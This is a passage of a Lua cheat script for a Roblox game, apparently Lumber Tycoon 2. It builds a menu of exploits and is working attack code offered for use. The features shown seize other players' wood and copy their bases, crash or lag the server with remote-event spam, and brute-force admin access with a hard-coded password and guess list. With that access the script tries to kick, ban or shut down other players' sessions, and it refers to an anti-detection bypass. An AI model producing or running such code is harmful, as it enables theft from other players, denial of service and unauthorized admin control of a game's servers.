                            if obj:FindFirstChild("Owner") and obj.Owner.Value ~= LocalPlayer then
                                if obj:FindFirstChild("TreeClass") and obj:FindFirstChild("WoodSection") then
                                    local distance = (obj:GetModelCFrame().Position - rootPart.Position).Magnitude
                                    
                                    if distance < 50 then
                                        -- Try to change ownership
                                        obj.Owner.Value = LocalPlayer
                                        
                                        -- Teleport wood to player
                                        obj:SetPrimaryPartCFrame(rootPart.CFrame * CFrame.new(0, 5, 0))
                                    end
                                end
                            end
                        end
                    end
                end)
            end)
        else
            if woodAuraConnection then
                woodAuraConnection:Disconnect()
            end
        end
    end)
    
    CreateButton("Bring All Wood", function()
        pcall(function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local rootPart = LocalPlayer.Character.HumanoidRootPart
                
                -- Find all wood in the workspace
                for _, obj in pairs(Workspace.LogModels:GetChildren()) do
                    if obj:FindFirstChild("TreeClass") and obj:FindFirstChild("WoodSection") then
                        -- Try to change ownership
                        if obj:FindFirstChild("Owner") then
                            obj.Owner.Value = LocalPlayer
                        else
                            local ownerValue = Instance.new("ObjectValue")
                            ownerValue.Name = "Owner"
                            ownerValue.Value = LocalPlayer
                            ownerValue.Parent = obj
                        end
                        
                        -- Teleport wood to player
                        obj:SetPrimaryPartCFrame(rootPart.CFrame * CFrame.new(0, 5, 0))
                    end
                end
                print("Brought all wood to player")
            end
        end)
    end)
end

-- Base Tab Content
TabContents["Base"] = function()
    CreateLabel("Base Management")
    
    CreateButton("Free Land", function()
        pcall(function()
            if ReplicatedStorage:FindFirstChild("PropertyPurchasing") and
               ReplicatedStorage.PropertyPurchasing:FindFirstChild("ClientExpandedLand") then
                ReplicatedStorage.PropertyPurchasing.ClientExpandedLand:FireServer(1, 1)
                print("Free land exploit attempted")
            end
        end)
    end)
    
    CreateButton("Max Land Size", function()
        pcall(function()
            if ReplicatedStorage:FindFirstChild("PropertyPurchasing") and
               ReplicatedStorage.PropertyPurchasing:FindFirstChild("ClientExpandedLand") then
                -- Try to expand land to maximum size
                for x = 1, 10 do
                    for y = 1, 10 do
                        ReplicatedStorage.PropertyPurchasing.ClientExpandedLand:FireServer(x, y)
                        wait(0.1)
                    end
                end
                print("Max land size exploit attempted")
            end
        end)
    end)
    
    CreateButton("Clear Base", function()
        pcall(function()
            -- Find player's base
            local playerBase = nil
            for _, base in pairs(Workspace.Properties:GetChildren()) do
                if base:FindFirstChild("Owner") and base.Owner.Value == LocalPlayer then
                    playerBase = base
                    break
                end
            end
            
            if playerBase then
                -- Delete all objects on the base
                for _, obj in pairs(playerBase:GetChildren()) do
                    if obj:IsA("Model") and obj.Name ~= "Origin" then
                        obj:Destroy()
                    end
                end
                print("Base cleared")
            else
                print("No base found")
            end
        end)
    end)
    
    CreateButton("Copy Another Base", function()
        -- Create a list of players
        local playerList = Instance.new("Frame")
        playerList.Name = "PlayerList"
        playerList.Parent = MainFrame
        playerList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        playerList.BorderSizePixel = 0
        playerList.Position = UDim2.new(0.5, -100, 0.5, -150)
        playerList.Size = UDim2.new(0, 200, 0, 300)
        playerList.ZIndex = 10
        
        local playerListCorner = Instance.new("UICorner")
        playerListCorner.CornerRadius = UDim.new(0, 10)
        playerListCorner.Parent = playerList
        
        local playerListTitle = Instance.new("TextLabel")
        playerListTitle.Parent = playerList
        playerListTitle.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
        playerListTitle.BorderSizePixel = 0
        playerListTitle.Size = UDim2.new(1, 0, 0, 30)
        playerListTitle.Font = Enum.Font.GothamBold
        playerListTitle.Text = "Select Player's Base"
        playerListTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        playerListTitle.TextScaled = true
        
        local playerListTitleCorner = Instance.new("UICorner")
        playerListTitleCorner.CornerRadius = UDim.new(0, 10)
        playerListTitleCorner.Parent = playerListTitle
        
        local playerListClose = Instance.new("TextButton")
        playerListClose.Parent = playerListTitle
        playerListClose.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
        playerListClose.BorderSizePixel = 0
        playerListClose.Position = UDim2.new(1, -25, 0, 5)
        playerListClose.Size = UDim2.new(0, 20, 0, 20)
        playerListClose.Font = Enum.Font.GothamBold
        playerListClose.Text = "X"
        playerListClose.TextColor3 = Color3.fromRGB(255, 255, 255)
        playerListClose.TextScaled = true
        playerListClose.ZIndex = 11
        
        local playerListCloseCorner = Instance.new("UICorner")
        playerListCloseCorner.CornerRadius = UDim.new(0, 5)
        playerListCloseCorner.Parent = playerListClose
        
        local playerListScrollFrame = Instance.new("ScrollingFrame")
        playerListScrollFrame.Parent = playerList
        playerListScrollFrame.BackgroundTransparency = 1
        playerListScrollFrame.BorderSizePixel = 0
        playerListScrollFrame.Position = UDim2.new(0, 5, 0, 35)
        playerListScrollFrame.Size = UDim2.new(1, -10, 1, -40)
        playerListScrollFrame.ScrollBarThickness = 5
        playerListScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(75, 0, 130)
        
        local playerListLayout = Instance.new("UIListLayout")
        playerListLayout.Parent = playerListScrollFrame
        playerListLayout.FillDirection = Enum.FillDirection.Vertical
        playerListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
        playerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
        playerListLayout.Padding = UDim.new(0, 2)
        
        -- Add players to the list
        for i, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local playerButton = Instance.new("TextButton")
                playerButton.Parent = playerListScrollFrame
                playerButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
                playerButton.BorderSizePixel = 0
                playerButton.Size = UDim2.new(1, -5, 0, 30)
                playerButton.Font = Enum.Font.Gotham
                playerButton.Text = player.Name
                playerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                playerButton.TextScaled = true
                
                local playerButtonCorner = Instance.new("UICorner")
                playerButtonCorner.CornerRadius = UDim.new(0, 5)
                playerButtonCorner.Parent = playerButton
                
                playerButton.MouseButton1Click:Connect(function()
                    -- Find player's base
                    local targetBase = nil
                    for _, base in pairs(Workspace.Properties:GetChildren()) do
                        if base:FindFirstChild("Owner") and base.Owner.Value == player then
                            targetBase = base
                            break
                        end
                    end
                    
                    -- Find local player's base
                    local playerBase = nil
                    for _, base in pairs(Workspace.Properties:GetChildren()) do
                        if base:FindFirstChild("Owner") and base.Owner.Value == LocalPlayer then
                            playerBase = base
                            break
                        end
                    end
                    
                    if targetBase and playerBase then
                        -- Copy the base
                        for _, obj in pairs(targetBase:GetChildren()) do
                            if obj:IsA("Model") and obj.Name ~= "Origin" then
                                local clonedObj = obj:Clone()
                                clonedObj.Parent = playerBase
                                
                                -- Update ownership
                                for _, child in pairs(clonedObj:GetDescendants()) do
                                    if child:IsA("ObjectValue") and child.Name == "Owner" then
                                        child.Value = LocalPlayer
                                    end
                                end
                            end
                        end
                        print("Copied " .. player.Name .. "'s base")
                    else
                        print("Base not found")
                    end
                    
                    playerList:Destroy()
                end)
            end
        end
        
        playerListClose.MouseButton1Click:Connect(function()
            playerList:Destroy()
        end)
        
        -- Update scroll frame canvas size
        playerListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            playerListScrollFrame.CanvasSize = UDim2.new(0, 0, 0, playerListLayout.AbsoluteContentSize.Y + 5)
        end)
    end)
    
    CreateButton("Unlock All Blueprints", function()
        pcall(function()
            if ReplicatedStorage:FindFirstChild("Purchasables") and
               ReplicatedStorage.Purchasables:FindFirstChild("Blueprints") then
                for _, blueprint in pairs(ReplicatedStorage.Purchasables.Blueprints:GetChildren()) do
                    if blueprint:FindFirstChild("Purchased") then
                        blueprint.Purchased.Value = true
                    end
                end
                print("All blueprints unlocked")
            end
        end)
    end)
end

-- Misc Tab Content
TabContents["Misc"] = function()
    CreateLabel("Miscellaneous Exploits")
    
    CreateToggle("Anti AFK", false, function(enabled)
        local antiAFKConnection
        if enabled then
            antiAFKConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    -- Simulate user activity
                    local virtualUser = game:GetService("VirtualUser")
                    virtualUser:CaptureController()
                    virtualUser:ClickButton2(Vector2.new())
                end)
            end)
        else
            if antiAFKConnection then
                antiAFKConnection:Disconnect()
            end
        end
    end)
    
    CreateToggle("Auto-Respawn", false, function(enabled)
        local autoRespawnConnection
        if enabled then
            autoRespawnConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        if LocalPlayer.Character.Humanoid.Health <= 0 then
                            wait(1)
                            LocalPlayer:LoadCharacter()
                        end
                    end
                end)
            end)
        else
            if autoRespawnConnection then
                autoRespawnConnection:Disconnect()
            end
        end
    end)
    
    CreateButton("Server Crash (Risky)", function()
        pcall(function()
            -- Warning message
            local warningFrame = Instance.new("Frame")
            warningFrame.Name = "WarningFrame"
            warningFrame.Parent = MainFrame
            warningFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            warningFrame.BorderSizePixel = 0
            warningFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
            warningFrame.Size = UDim2.new(0, 300, 0, 200)
            warningFrame.ZIndex = 10
            
            local warningCorner = Instance.new("UICorner")
            warningCorner.CornerRadius = UDim.new(0, 10)
            warningCorner.Parent = warningFrame
            
            local warningTitle = Instance.new("TextLabel")
            warningTitle.Parent = warningFrame
            warningTitle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
            warningTitle.BorderSizePixel = 0
            warningTitle.Size = UDim2.new(1, 0, 0, 30)
            warningTitle.Font = Enum.Font.GothamBold
            warningTitle.Text = "WARNING"
            warningTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            warningTitle.TextScaled = true
            
            local warningTitleCorner = Instance.new("UICorner")
            warningTitleCorner.CornerRadius = UDim.new(0, 10)
            warningTitleCorner.Parent = warningTitle
            
            local warningText = Instance.new("TextLabel")
            warningText.Parent = warningFrame
            warningText.BackgroundTransparency = 1
            warningText.Position = UDim2.new(0, 10, 0, 40)
            warningText.Size = UDim2.new(1, -20, 0, 100)
            warningText.Font = Enum.Font.Gotham
            warningText.Text = "This will attempt to crash the server and may result in your account being banned. Are you sure you want to continue?"
            warningText.TextColor3 = Color3.fromRGB(255, 255, 255)
            warningText.TextWrapped = true
            
            local confirmButton = Instance.new("TextButton")
            confirmButton.Parent = warningFrame
            confirmButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
            confirmButton.BorderSizePixel = 0
            confirmButton.Position = UDim2.new(0, 20, 1, -50)
            confirmButton.Size = UDim2.new(0.5, -30, 0, 30)
            confirmButton.Font = Enum.Font.GothamBold
            confirmButton.Text = "Yes, Crash"
            confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            confirmButton.TextScaled = true
            
            local confirmCorner = Instance.new("UICorner")
            confirmCorner.CornerRadius = UDim.new(0, 5)
            confirmCorner.Parent = confirmButton
            
            local cancelButton = Instance.new("TextButton")
            cancelButton.Parent = warningFrame
            cancelButton.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
            cancelButton.BorderSizePixel = 0
            cancelButton.Position = UDim2.new(0.5, 10, 1, -50)
            cancelButton.Size = UDim2.new(0.5, -30, 0, 30)
            cancelButton.Font = Enum.Font.GothamBold
            cancelButton.Text = "Cancel"
            cancelButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            cancelButton.TextScaled = true
            
            local cancelCorner = Instance.new("UICorner")
            cancelCorner.CornerRadius = UDim.new(0, 5)
            cancelCorner.Parent = cancelButton
            
            confirmButton.MouseButton1Click:Connect(function()
                -- Attempt to crash server with spam
                for i = 1, 1000 do
                    if ReplicatedStorage:FindFirstChild("Interaction") and
                       ReplicatedStorage.Interaction:FindFirstChild("RemoteProxy") then
                        ReplicatedStorage.Interaction.RemoteProxy:FireServer("crash")
                    end
                    
                    if ReplicatedStorage:FindFirstChild("Transactions") and
                       ReplicatedStorage.Transactions:FindFirstChild("AddLog") then
                        ReplicatedStorage.Transactions.AddLog:InvokeServer("Exploit", "Crash attempt")
                    end
                    
                    -- Spawn massive amounts of objects
                    for j = 1, 10 do
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local part = Instance.new("Part")
                            part.Size = Vector3.new(10, 10, 10)
                            part.Position = LocalPlayer.Character.HumanoidRootPart.Position
                            part.Anchored = false
                            part.CanCollide = true
                            part.Parent = Workspace
                        end
                    end
                end
                
                warningFrame:Destroy()
            end)
            
            cancelButton.MouseButton1Click:Connect(function()
                warningFrame:Destroy()
            end)
        end)
    end)
    
    CreateToggle("Lag Switch", false, function(enabled)
        if enabled then
            -- Create artificial lag
            for i = 1, 100 do
                spawn(function()
                    while true do
                        wait()
                    end
                end)
            end
            print("Lag switch enabled")
        else
            print("Lag switch can't be disabled once enabled")
        end
    end)
    
    CreateButton("Remove Water", function()
        pcall(function()
            -- Remove water for better visibility
            if Workspace:FindFirstChild("Water") then
                Workspace.Water.Transparency = 1
                print("Water made transparent")
            end
        end)
    end)
    
    CreateButton("Remove Fog", function()
        pcall(function()
            -- Remove fog for better visibility
            if game:GetService("Lighting"):FindFirstChild("Atmosphere") then
                game:GetService("Lighting").Atmosphere.Density = 0
                print("Fog removed")
            end
            
            game:GetService("Lighting").FogEnd = 1000000
            game:GetService("Lighting").FogStart = 0
            print("Fog settings adjusted")
        end)
    end)
end

-- Admin Tab Content
TabContents["Admin"] = function()
    CreateLabel("Admin Commands (Use with caution)")
    
    -- Based on our analysis of the game files, we found the admin password "zebraman"
    CreateButton("Use Admin Password (zebraman)", function()
        pcall(function()
            -- Use the discovered admin password
            if ReplicatedStorage:FindFirstChild("AdminCommands") and
               ReplicatedStorage.AdminCommands:FindFirstChild("AdminPassword") then
                local success, result = pcall(function()
                    return ReplicatedStorage.AdminCommands.AdminPassword:InvokeServer("zebraman")
                end)
                
                if success then
                    print("Admin password accepted!")
                    
                    -- Create a notification
                    local notification = Instance.new("Frame")
                    notification.Name = "AdminNotification"
                    notification.Parent = MainFrame
                    notification.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
                    notification.BorderSizePixel = 0
                    notification.Position = UDim2.new(0.5, -150, 0, 10)
                    notification.Size = UDim2.new(0, 300, 0, 50)
                    notification.ZIndex = 10
                    
                    local notificationCorner = Instance.new("UICorner")
                    notificationCorner.CornerRadius = UDim.new(0, 5)
                    notificationCorner.Parent = notification
                    
                    local notificationText = Instance.new("TextLabel")
                    notificationText.Parent = notification
                    notificationText.BackgroundTransparency = 1
                    notificationText.Position = UDim2.new(0, 10, 0, 0)
                    notificationText.Size = UDim2.new(1, -20, 1, 0)
                    notificationText.Font = Enum.Font.GothamBold
                    notificationText.Text = "Admin access granted!"
                    notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
                    notificationText.TextScaled = true
                    
                    -- Remove notification after 3 seconds
                    spawn(function()
                        wait(3)
                        notification:Destroy()
                    end)
                else
                    print("Admin password rejected")
                end
            end
        end)
    end)
    
    CreateButton("Try Other Admin Passwords", function()
        pcall(function()
            -- Try common admin passwords
            local passwords = {
                "admin", "password", "123456", "defaultadmin",
                "lumber", "tycoon", "lumber2", "admin123", "adminpass",
                "zebra", "zebras", "zebraadmin"
            }
            
            for _, password in pairs(passwords) do
                if ReplicatedStorage:FindFirstChild("AdminCommands") and
                   ReplicatedStorage.AdminCommands:FindFirstChild("AdminPassword") then
                    local success = pcall(function()
                        ReplicatedStorage.AdminCommands.AdminPassword:InvokeServer(password)
                    end)
                    
                    if success then
                        print("Password might have worked: " .. password)
                    end
                end
            end
            print("Attempted admin password bypass with multiple passwords")
        end)
    end)
    
    CreateButton("Admin Save Slot Exploit", function()
        pcall(function()
            -- Based on our analysis of the LoadSaveClient script
            local currentSaveSlot = LocalPlayer:FindFirstChild("CurrentSaveSlot")
            if currentSaveSlot then
                -- Generate a random seed like the game does
                local seed = math.random()
                
                -- Try to set the current slot to admin mode (-1)
                if currentSaveSlot:FindFirstChild("Set") then
                    -- First try the "zebras" password found in the code
                    currentSaveSlot.Set:Invoke(seed, "zebras")
                    
                    -- Then set to admin mode
                    currentSaveSlot.Set:Invoke(0, seed)
                    currentSaveSlot.Set:Invoke(-1, seed)
                    
                    print("Admin save slot exploit attempted")
                    
                    -- Create a notification
                    local notification = Instance.new("Frame")
                    notification.Name = "AdminNotification"
                    notification.Parent = MainFrame
                    notification.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
                    notification.BorderSizePixel = 0
                    notification.Position = UDim2.new(0.5, -150, 0, 10)
                    notification.Size = UDim2.new(0, 300, 0, 50)
                    notification.ZIndex = 10
                    
                    local notificationCorner = Instance.new("UICorner")
                    notificationCorner.CornerRadius = UDim.new(0, 5)
                    notificationCorner.Parent = notification
                    
                    local notificationText = Instance.new("TextLabel")
                    notificationText.Parent = notification
                    notificationText.BackgroundTransparency = 1
                    notificationText.Position = UDim2.new(0, 10, 0, 0)
                    notificationText.Size = UDim2.new(1, -20, 1, 0)
                    notificationText.Font = Enum.Font.GothamBold
                    notificationText.Text = "Admin save slot exploit activated!"
                    notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
                    notificationText.TextScaled = true
                    
                    -- Remove notification after 3 seconds
                    spawn(function()
                        wait(3)
                        notification:Destroy()
                    end)
                end
            end
        end)
    end)
    
    CreateButton("Give Admin", function()
        pcall(function()
            -- First try to authenticate as admin
            if ReplicatedStorage:FindFirstChild("AdminCommands") then
                if ReplicatedStorage.AdminCommands:FindFirstChild("AdminPassword") then
                    ReplicatedStorage.AdminCommands.AdminPassword:InvokeServer("zebraman")
                end
                
                -- Then try to give admin
                if ReplicatedStorage.AdminCommands:FindFirstChild("GiveAdmin") then
                    ReplicatedStorage.AdminCommands.GiveAdmin:InvokeServer(LocalPlayer)
                    print("Attempted to give admin")
                end
            end
        end)
    end)
    
    CreateButton("Kick All Players", function()
        pcall(function()
            -- First try to authenticate as admin
            if ReplicatedStorage:FindFirstChild("AdminCommands") then
                if ReplicatedStorage.AdminCommands:FindFirstChild("AdminPassword") then
                    ReplicatedStorage.AdminCommands.AdminPassword:InvokeServer("zebraman")
                end
                
                -- Then try to kick all players
                if ReplicatedStorage.AdminCommands:FindFirstChild("KickPlayer") then
                    for _, player in pairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            ReplicatedStorage.AdminCommands.KickPlayer:InvokeServer(player)
                        end
                    end
                    print("Attempted to kick all players")
                end
            end
        end)
    end)
    
    CreateButton("Ban Player", function()
        -- First try to authenticate as admin
        if ReplicatedStorage:FindFirstChild("AdminCommands") and
           ReplicatedStorage.AdminCommands:FindFirstChild("AdminPassword") then
            ReplicatedStorage.AdminCommands.AdminPassword:InvokeServer("zebraman")
        end
        
        -- Create a list of players
        local playerList = Instance.new("Frame")
        playerList.Name = "PlayerList"
        playerList.Parent = MainFrame
        playerList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        playerList.BorderSizePixel = 0
        playerList.Position = UDim2.new(0.5, -100, 0.5, -150)
        playerList.Size = UDim2.new(0, 200, 0, 300)
        playerList.ZIndex = 10
        
        local playerListCorner = Instance.new("UICorner")
        playerListCorner.CornerRadius = UDim.new(0, 10)
        playerListCorner.Parent = playerList
        
        local playerListTitle = Instance.new("TextLabel")
        playerListTitle.Parent = playerList
        playerListTitle.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
        playerListTitle.BorderSizePixel = 0
        playerListTitle.Size = UDim2.new(1, 0, 0, 30)
        playerListTitle.Font = Enum.Font.GothamBold
        playerListTitle.Text = "Select Player to Ban"
        playerListTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        playerListTitle.TextScaled = true
        
        local playerListTitleCorner = Instance.new("UICorner")
        playerListTitleCorner.CornerRadius = UDim.new(0, 10)
        playerListTitleCorner.Parent = playerListTitle
        
        local playerListClose = Instance.new("TextButton")
        playerListClose.Parent = playerListTitle
        playerListClose.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
        playerListClose.BorderSizePixel = 0
        playerListClose.Position = UDim2.new(1, -25, 0, 5)
        playerListClose.Size = UDim2.new(0, 20, 0, 20)
        playerListClose.Font = Enum.Font.GothamBold
        playerListClose.Text = "X"
        playerListClose.TextColor3 = Color3.fromRGB(255, 255, 255)
        playerListClose.TextScaled = true
        playerListClose.ZIndex = 11
        
        local playerListCloseCorner = Instance.new("UICorner")
        playerListCloseCorner.CornerRadius = UDim.new(0, 5)
        playerListCloseCorner.Parent = playerListClose
        
        local playerListScrollFrame = Instance.new("ScrollingFrame")
        playerListScrollFrame.Parent = playerList
        playerListScrollFrame.BackgroundTransparency = 1
        playerListScrollFrame.BorderSizePixel = 0
        playerListScrollFrame.Position = UDim2.new(0, 5, 0, 35)
        playerListScrollFrame.Size = UDim2.new(1, -10, 1, -40)
        playerListScrollFrame.ScrollBarThickness = 5
        playerListScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(75, 0, 130)
        
        local playerListLayout = Instance.new("UIListLayout")
        playerListLayout.Parent = playerListScrollFrame
        playerListLayout.FillDirection = Enum.FillDirection.Vertical
        playerListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
        playerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
        playerListLayout.Padding = UDim.new(0, 2)
        
        -- Add players to the list
        for i, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local playerButton = Instance.new("TextButton")
                playerButton.Parent = playerListScrollFrame
                playerButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
                playerButton.BorderSizePixel = 0
                playerButton.Size = UDim2.new(1, -5, 0, 30)
                playerButton.Font = Enum.Font.Gotham
                playerButton.Text = player.Name
                playerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                playerButton.TextScaled = true
                
                local playerButtonCorner = Instance.new("UICorner")
                playerButtonCorner.CornerRadius = UDim.new(0, 5)
                playerButtonCorner.Parent = playerButton
                
                playerButton.MouseButton1Click:Connect(function()
                    if ReplicatedStorage:FindFirstChild("AdminCommands") and
                       ReplicatedStorage.AdminCommands:FindFirstChild("BanPlayer") then
                        ReplicatedStorage.AdminCommands.BanPlayer:InvokeServer(player)
                        print("Attempted to ban " .. player.Name)
                    end
                    
                    playerList:Destroy()
                end)
            end
        end
        
        playerListClose.MouseButton1Click:Connect(function()
            playerList:Destroy()
        end)
        
        -- Update scroll frame canvas size
        playerListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            playerListScrollFrame.CanvasSize = UDim2.new(0, 0, 0, playerListLayout.AbsoluteContentSize.Y + 5)
        end)
    end)
    
    CreateButton("Server Shutdown", function()
        pcall(function()
            -- First try to authenticate as admin
            if ReplicatedStorage:FindFirstChild("AdminCommands") then
                if ReplicatedStorage.AdminCommands:FindFirstChild("AdminPassword") then
                    ReplicatedStorage.AdminCommands.AdminPassword:InvokeServer("zebraman")
                end
                
                -- Then try to shutdown the server
                if ReplicatedStorage.AdminCommands:FindFirstChild("ShutdownServer") then
                    ReplicatedStorage.AdminCommands.ShutdownServer:InvokeServer()
                    print("Attempted server shutdown")
                end
            end
        end)
    end)
    
    CreateButton("Admin Log Viewer", function()
        pcall(function()
            -- First try to authenticate as admin
            if ReplicatedStorage:FindFirstChild("AdminCommands") and
               ReplicatedStorage.AdminCommands:FindFirstChild("AdminPassword") then
                ReplicatedStorage.AdminCommands.AdminPassword:InvokeServer("zebraman")
            end
            
            -- Create a log viewer window
            local logViewer = Instance.new("Frame")
            logViewer.Name = "LogViewer"
            logViewer.Parent = MainFrame
            logViewer.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            logViewer.BorderSizePixel = 0
            logViewer.Position = UDim2.new(0.5, -250, 0.5, -200)
            logViewer.Size = UDim2.new(0, 500, 0, 400)
            logViewer.ZIndex = 10
            
            local logViewerCorner = Instance.new("UICorner")
            logViewerCorner.CornerRadius = UDim.new(0, 10)
            logViewerCorner.Parent = logViewer
            
            local logViewerTitle = Instance.new("TextLabel")
            logViewerTitle.Parent = logViewer
            logViewerTitle.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
            logViewerTitle.BorderSizePixel = 0
            logViewerTitle.Size = UDim2.new(1, 0, 0, 30)
            logViewerTitle.Font = Enum.Font.GothamBold
            logViewerTitle.Text = "Admin Log Viewer"
            logViewerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            logViewerTitle.TextScaled = true
            
            local logViewerTitleCorner = Instance.new("UICorner")
            logViewerTitleCorner.CornerRadius = UDim.new(0, 10)
            logViewerTitleCorner.Parent = logViewerTitle
            
            local logViewerClose = Instance.new("TextButton")
            logViewerClose.Parent = logViewerTitle
            logViewerClose.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
            logViewerClose.BorderSizePixel = 0
            logViewerClose.Position = UDim2.new(1, -25, 0, 5)
            logViewerClose.Size = UDim2.new(0, 20, 0, 20)
            logViewerClose.Font = Enum.Font.GothamBold
            logViewerClose.Text = "X"
            logViewerClose.TextColor3 = Color3.fromRGB(255, 255, 255)
            logViewerClose.TextScaled = true
            logViewerClose.ZIndex = 11
            
            local logViewerCloseCorner = Instance.new("UICorner")
            logViewerCloseCorner.CornerRadius = UDim.new(0, 5)
            logViewerCloseCorner.Parent = logViewerClose
            
            local logViewerScrollFrame = Instance.new("ScrollingFrame")
            logViewerScrollFrame.Parent = logViewer
            logViewerScrollFrame.BackgroundTransparency = 1
            logViewerScrollFrame.BorderSizePixel = 0
            logViewerScrollFrame.Position = UDim2.new(0, 10, 0, 40)
            logViewerScrollFrame.Size = UDim2.new(1, -20, 1, -50)
            logViewerScrollFrame.ScrollBarThickness = 5
            logViewerScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(75, 0, 130)
            
            local logViewerLayout = Instance.new("UIListLayout")
            logViewerLayout.Parent = logViewerScrollFrame
            logViewerLayout.FillDirection = Enum.FillDirection.Vertical
            logViewerLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
            logViewerLayout.SortOrder = Enum.SortOrder.LayoutOrder
            logViewerLayout.Padding = UDim.new(0, 2)
            
            -- Try to get logs
            local logs = {}
            
            -- Try different methods to get logs
            if ReplicatedStorage:FindFirstChild("Transactions") and
               ReplicatedStorage.Transactions:FindFirstChild("GetLogs") then
                local success, result = pcall(function()
                    return ReplicatedStorage.Transactions.GetLogs:InvokeServer()
                end)
                
                if success and result then
                    logs = result
                end
            end
            
            -- If no logs found, try another method
            if #logs == 0 and ReplicatedStorage:FindFirstChild("LoadSaveRequests") and
               ReplicatedStorage.LoadSaveRequests:FindFirstChild("GetMetaData") then
                local success, result = pcall(function()
                    return ReplicatedStorage.LoadSaveRequests.GetMetaData:InvokeServer(LocalPlayer)
                end)
                
                if success and result then
                    logs = result
                end
            end
            
            -- Display logs or a message if none found
            if #logs > 0 then
                for i, log in ipairs(logs) do
                    local logEntry = Instance.new("Frame")
                    logEntry.Parent = logViewerScrollFrame
                    logEntry.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
                    logEntry.BorderSizePixel = 0
                    logEntry.Size = UDim2.new(1, -5, 0, 30)
                    
                    local logEntryCorner = Instance.new("UICorner")
                    logEntryCorner.CornerRadius = UDim.new(0, 5)
                    logEntryCorner.Parent = logEntry
                    
                    local logEntryText = Instance.new("TextLabel")
                    logEntryText.Parent = logEntry
                    logEntryText.BackgroundTransparency = 1
                    logEntryText.Position = UDim2.new(0, 10, 0, 0)
                    logEntryText.Size = UDim2.new(1, -20, 1, 0)
                    logEntryText.Font = Enum.Font.Gotham
                    logEntryText.Text = tostring(log)
                    logEntryText.TextColor3 = Color3.fromRGB(255, 255, 255)
                    logEntryText.TextXAlignment = Enum.TextXAlignment.Left
                    logEntryText.TextScaled = true
                end
            else
                local noLogsLabel = Instance.new("TextLabel")
                noLogsLabel.Parent = logViewerScrollFrame
                noLogsLabel.BackgroundTransparency = 1
                noLogsLabel.Size = UDim2.new(1, 0, 0, 30)
                noLogsLabel.Font = Enum.Font.Gotham
                noLogsLabel.Text = "No logs found or access denied"
                noLogsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                noLogsLabel.TextScaled = true
            end
            
            logViewerClose.MouseButton1Click:Connect(function()
                logViewer:Destroy()
            end)
            
            -- Update scroll frame canvas size
            logViewerLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
                logViewerScrollFrame.CanvasSize = UDim2.new(0, 0, 0, logViewerLayout.AbsoluteContentSize.Y + 5)
            end)
        end)
    end)
end

-- Create Tabs
local tabs = {
    {"Security", 1},
    {"Player", 2},
    {"Money", 3},
    {"Teleport", 4},
    {"Tools", 5},
    {"Wood", 6},
    {"Base", 7},
    {"Misc", 8},
    {"Admin", 9}
}

local tabButtons = {}

for _, tabData in pairs(tabs) do
    local tabName, layoutOrder = tabData[1], tabData[2]
    local tabButton = CreateTab(tabName, layoutOrder)
    tabButtons[tabName] = tabButton
    
    tabButton.MouseButton1Click:Connect(function()
        -- Update tab appearance
        for _, btn in pairs(tabButtons) do
            btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            btn.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
        
        tabButton.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
        tabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        
        ShowTab(tabName)
    end)
end

-- Close button functionality
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    
    -- Clean up any connections
    if AntiDetection.Enabled then
        AntiDetection:DisableBypass()
    end
end)

-- Initialize with Security tab
ShowTab("Security")
tabButtons["Security"].BackgroundColor3 = Color3.fromRGB(75, 0, 130)
tabButtons["Security"].TextColor3 = Color3.fromRGB(255, 255, 255)

-- Update ScrollFrame canvas size
local function UpdateScrollFrame()
